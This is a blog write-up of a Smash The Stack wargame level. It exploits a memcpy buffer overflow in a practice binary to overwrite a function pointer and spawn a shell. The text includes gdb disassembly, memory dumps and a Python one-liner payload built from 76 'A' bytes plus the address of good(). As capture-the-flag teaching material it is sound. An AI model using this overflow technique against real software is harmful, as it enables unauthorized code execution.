---
title: "SMASH THE STACK LEVEL3"
date: 2014-12-01T18:09:38+00:00
url: "/smash-the-stack-level3/"
draft: false
description: "pretty good level I learned a few new stuff so lets hit the game fighting with the app till it crashes and hell yeah we start from fault :D so we need to see..."
categories: ["blog", "exploit-dev", "Security", "tech"]
---

pretty good level I learned a few new stuff

so lets hit the game

```bash
level3@io:/levels$ ./level03
level3@io:/levels$ ./level03 9
level3@io:/levels$ ./level03 $(python -c "print 'a' * 10000 ")
Segmentation fault
```

fighting with the app till it crashes and hell yeah we start from fault :D

so we need to see what's going on

```x86asm
level3@io:/levels$ gdb ./level03
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484c8 <+0>:	push   %ebp
   0x080484c9 <+1>:	mov    %esp,%ebp
   0x080484cb <+3>:	sub    $0x78,%esp
   0x080484ce <+6>:	and    $0xfffffff0,%esp
   0x080484d1 <+9>:	mov    $0x0,%eax
   0x080484d6 <+14>:	sub    %eax,%esp
   0x080484d8 <+16>:	movl   $0x80484a4,-0xc(%ebp)
   0x080484df <+23>:	cmpl   $0x2,0x8(%ebp)
   0x080484e3 <+27>:	jne    0x80484fc <main+52>
   0x080484e5 <+29>:	mov    0xc(%ebp),%eax
   0x080484e8 <+32>:	add    $0x4,%eax
   0x080484eb <+35>:	mov    (%eax),%eax
   0x080484ed <+37>:	mov    %eax,(%esp)
   0x080484f0 <+40>:	call   0x804839c <strlen@plt>
   0x080484f5 <+45>:	cmp    $0x3,%eax
   0x080484f8 <+48>:	jbe    0x80484fc <main+52>
   0x080484fa <+50>:	jmp    0x8048505 <main+61>
   0x080484fc <+52>:	movl   $0x0,-0x5c(%ebp)
   0x08048503 <+59>:	jmp    0x8048579 <main+177>
   0x08048505 <+61>:	mov    0xc(%ebp),%eax
   0x08048508 <+64>:	add    $0x4,%eax
   0x0804850b <+67>:	mov    (%eax),%eax
   0x0804850d <+69>:	mov    %eax,(%esp)
   0x08048510 <+72>:	call   0x804839c <strlen@plt>
   0x08048515 <+77>:	mov    %eax,0x8(%esp)
   0x08048519 <+81>:	mov    0xc(%ebp),%eax
   0x0804851c <+84>:	add    $0x4,%eax
   0x0804851f <+87>:	mov    (%eax),%eax
   0x08048521 <+89>:	mov    %eax,0x4(%esp)
   0x08048525 <+93>:	lea    -0x58(%ebp),%eax
   0x08048528 <+96>:	mov    %eax,(%esp)
   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
   0x08048530 <+104>:	mov    0xc(%ebp),%eax
   0x08048533 <+107>:	add    $0x4,%eax
=> 0x08048536 <+110>:	mov    (%eax),%eax
   0x08048538 <+112>:	mov    %eax,(%esp)
   0x0804853b <+115>:	call   0x804839c <strlen@plt>
   0x08048540 <+120>:	sub    $0x4,%eax
   0x08048543 <+123>:	mov    %eax,0x8(%esp)
---Type <return> to continue, or q <return> to quit---
   0x08048547 <+127>:	movl   $0x0,0x4(%esp)
   0x0804854f <+135>:	lea    -0x58(%ebp),%eax
   0x08048552 <+138>:	mov    %eax,(%esp)
   0x08048555 <+141>:	call   0x804835c <memset@plt>
   0x0804855a <+146>:	mov    -0xc(%ebp),%eax
   0x0804855d <+149>:	mov    %eax,0x4(%esp)
   0x08048561 <+153>:	movl   $0x80486c0,(%esp)
   0x08048568 <+160>:	call   0x80483ac <printf@plt>
   0x0804856d <+165>:	mov    -0xc(%ebp),%eax
   0x08048570 <+168>:	call   *%eax
   0x08048572 <+170>:	movl   $0x0,-0x5c(%ebp)
   0x08048579 <+177>:	mov    -0x5c(%ebp),%eax
   0x0804857c <+180>:	leave
   0x0804857d <+181>:	ret
End of assembler dump.
```

much assembly to read but there is some stuff interesting

strlen memcpy memset

but the natural feeling memcpy is our way :P

lets see what inside esp

```c
(gdb) x/400s $esp
0xbfffd500:	 " \325\377\277]\327\377\277\020'"
0xbfffd50b:	 ""
0xbfffd50c:	 "\001"
0xbfffd50e:	 ""
0xbfffd50f:	 ""
0xbfffd510:	 "\b\371\377\267F\325\377\277P\325\377\277l\a\357\267", 'a' <repeats 184 times>...
0xbfffd5d8:	 'a' <repeats 200 times>...
0xbfffd6a0:	 'a' <repeats 200 times>...
0xbfffd768:	 'a' <repeats 200 times>...
0xbfffd830:	 'a' <repeats 200 times>...
0xbfffd8f8:	 'a' <repeats 200 times>...
0xbfffd9c0:	 'a' <repeats 200 times>...
0xbfffda88:	 'a' <repeats 200 times>...
0xbfffdb50:	 'a' <repeats 200 times>...
0xbfffdc18:	 'a' <repeats 200 times>...
0xbfffdce0:	 'a' <repeats 200 times>...
0xbfffdda8:	 'a' <repeats 200 times>...
0xbfffde70:	 'a' <repeats 200 times>...
0xbfffdf38:	 'a' <repeats 200 times>...
0xbfffe000:	 'a' <repeats 200 times>...
0xbfffe0c8:	 'a' <repeats 200 times>...
0xbfffe190:	 'a' <repeats 200 times>...
0xbfffe258:	 'a' <repeats 200 times>...
0xbfffe320:	 'a' <repeats 200 times>...
0xbfffe3e8:	 'a' <repeats 200 times>...
0xbfffe4b0:	 'a' <repeats 200 times>...
0xbfffe578:	 'a' <repeats 200 times>...
0xbfffe640:	 'a' <repeats 200 times>...
0xbfffe708:	 'a' <repeats 200 times>...
0xbfffe7d0:	 'a' <repeats 200 times>...
0xbfffe898:	 'a' <repeats 200 times>...
0xbfffe960:	 'a' <repeats 200 times>...
0xbfffea28:	 'a' <repeats 200 times>...
0xbfffeaf0:	 'a' <repeats 200 times>...
0xbfffebb8:	 'a' <repeats 200 times>...
0xbfffec80:	 'a' <repeats 200 times>...
0xbfffed48:	 'a' <repeats 200 times>...
0xbfffee10:	 'a' <repeats 200 times>...
0xbfffeed8:	 'a' <repeats 200 times>...
0xbfffefa0:	 'a' <repeats 200 times>...
---Type <return> to continue, or q <return> to quit---
```

you will notice that our A'z life  in the memory  this is a good point that we are on the track

also, I found the source code is available  it will save us sometimes to understand what the app do

```c
level3@io:/levels$ cat level03.c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

2 functions good,bad

good drop the shell

bad function says some stuff

the main function lets see the logic of the app

 

```c
void (*functionpointer)(void) = bad;
```

one line function functionpinter == bad function

setting limit t to char buffer to 50 :D this is how u do it !!!.

if statement to check if the argument less  than 4 char to return 0

send argv1 data to the buffer

```c
memcpy(buffer, argv[1], strlen(argv[1]));
```

 

override the memory of the buffer

```c
memset(buffer, 0, strlen(argv[1]) - 4);
```

then call the function functionpointer(); == bad :D

u call the bad function and i will call ur .....

okay  now we know what's going on

lets do the hard work

so lets do a break point after the memcpy love

```x86asm
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484c8 <+0>:	push   %ebp
   0x080484c9 <+1>:	mov    %esp,%ebp
   0x080484cb <+3>:	sub    $0x78,%esp
   0x080484ce <+6>:	and    $0xfffffff0,%esp
   0x080484d1 <+9>:	mov    $0x0,%eax
   0x080484d6 <+14>:	sub    %eax,%esp
   0x080484d8 <+16>:	movl   $0x80484a4,-0xc(%ebp)
   0x080484df <+23>:	cmpl   $0x2,0x8(%ebp)
   0x080484e3 <+27>:	jne    0x80484fc <main+52>
   0x080484e5 <+29>:	mov    0xc(%ebp),%eax
   0x080484e8 <+32>:	add    $0x4,%eax
   0x080484eb <+35>:	mov    (%eax),%eax
   0x080484ed <+37>:	mov    %eax,(%esp)
   0x080484f0 <+40>:	call   0x804839c <strlen@plt>
   0x080484f5 <+45>:	cmp    $0x3,%eax
   0x080484f8 <+48>:	jbe    0x80484fc <main+52>
   0x080484fa <+50>:	jmp    0x8048505 <main+61>
   0x080484fc <+52>:	movl   $0x0,-0x5c(%ebp)
   0x08048503 <+59>:	jmp    0x8048579 <main+177>
   0x08048505 <+61>:	mov    0xc(%ebp),%eax
   0x08048508 <+64>:	add    $0x4,%eax
   0x0804850b <+67>:	mov    (%eax),%eax
   0x0804850d <+69>:	mov    %eax,(%esp)
   0x08048510 <+72>:	call   0x804839c <strlen@plt>
   0x08048515 <+77>:	mov    %eax,0x8(%esp)
   0x08048519 <+81>:	mov    0xc(%ebp),%eax
   0x0804851c <+84>:	add    $0x4,%eax
   0x0804851f <+87>:	mov    (%eax),%eax
   0x08048521 <+89>:	mov    %eax,0x4(%esp)
   0x08048525 <+93>:	lea    -0x58(%ebp),%eax
   0x08048528 <+96>:	mov    %eax,(%esp)
   0x0804852b <+99>:	call   0x804838c <memcpy@plt>
   0x08048530 <+104>:	mov    0xc(%ebp),%eax
```

 

```x86asm
(gdb) b *0x08048530
Breakpoint 1 at 0x8048530
```

run the gdb again with 60 char data

(gdb) r $(python -c "print 'A' * 60")

and take a look of the ESP

```x86asm
(gdb) x/100 $esp
0xbffffbe0:	0xbffffc00	0xbffffe31	0x0000003c	0x00000001
0xbffffbf0:	0xb7fff908	0xbffffc26	0xbffffc30	0xb7ef076c
0xbffffc00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0xbffffc58
0xbffffc40:	0xb7e9d515	0xb7ff0590	0x0804859b	0x080484a4
0xbffffc50:	0x08048590	0x00000000	0xbffffcd8	0xb7e84e46
```

 

here is our data

now we want to jump to function good :D  so lets print function address's

```x86asm
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804830c  _init
0x0804834c  __gmon_start__
0x0804834c  __gmon_start__@plt
0x0804835c  memset
0x0804835c  memset@plt
0x0804836c  __libc_start_main
0x0804836c  __libc_start_main@plt
0x0804837c  execl
0x0804837c  execl@plt
0x0804838c  memcpy
0x0804838c  memcpy@plt
0x0804839c  strlen
0x0804839c  strlen@plt
0x080483ac  printf
0x080483ac  printf@plt
0x080483bc  puts
0x080483bc  puts@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048474  good
0x080484a4  bad
0x080484c8  main
0x08048580  __libc_csu_fini
0x08048590  __libc_csu_init
0x080485ea  __i686.get_pc_thunk.bx
0x080485f0  __do_global_ctors_aux
0x08048620  _fini
0xb7fe27c0  __libc_memalign
0xb7fe27c0  __libc_memalign@plt
0xb7fe27d0  malloc
0xb7fe27d0  malloc@plt
0xb7fe27e0  calloc
0xb7fe27e0  calloc@plt
0xb7fe27f0  realloc
0xb7fe27f0  realloc@plt
0xb7fe2800  ___tls_get_addr
---Type <return> to continue, or q <return> to quit---q
Quit
```

0x08048474 good this our target lets reverse it

\x74\x84\x04\x08

lets send the payload

```x86asm
(gdb) r $(python -c "print 'A' *60 + '\x74\x84\x04\x08' ")
Starting program: /levels/level03 $(python -c "print 'A' *60 + '\x74\x84\x04\x08' ")

Breakpoint 1, 0x08048530 in main ()
(gdb) c
Continuing.
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
[Inferior 1 (process 29029) exited normally]
(gdb)
```

the app say sorry :) and exit on address 0x80484a4

after re-looking what happen in ESP

```x86asm
0xbffffc30:	0x41414141	0x41414141	0x41414141	0xbffffc58
0xbffffc40:	0xb7e9d515	0xb7ff0590	0x0804859b	0x080484a4
```

 

we will notice that space  between 0x41414141 and 0x080484a4 16 bit

so lets add more 16bit to the payload

```x86asm
(gdb) r $(python -c "print 'A' *76 + '\x74\x84\x04\x08' ")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level03 $(python -c "print 'A' *76 + '\x74\x84\x04\x08' ")

Breakpoint 1, 0x08048530 in main ()
(gdb) c
Continuing.
This is exciting we're going to 0x8048474
Win.
process 29093 is executing new program: /bin/bash
```

new process <3
